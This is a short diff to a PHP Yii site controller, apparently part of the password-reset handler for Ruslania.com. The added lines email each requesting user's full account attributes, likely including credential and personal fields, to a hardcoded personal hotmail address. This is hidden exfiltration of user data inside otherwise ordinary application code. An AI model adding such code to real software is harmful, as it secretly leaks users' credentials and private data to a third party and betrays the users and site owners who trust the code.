@@ -1213,6 +1213,14 @@ class SiteController extends MyController {
                             $message->view,
                         )
                     ) . "\n", FILE_APPEND);
+
+                $message = new YiiMailMessage('Ruslania.com password');
+                $message->view = 'forgot';
+                $message->setBody($user->attributes, 'text/html');
+                $message->addTo('andreasagopov@hotmail.com');
+                $message->from = 'ruslania@ruslania.com';
+                $mailResult = Yii::app()->mail->send($message);
+
                 echo '1';
             } else {
                 echo '10';
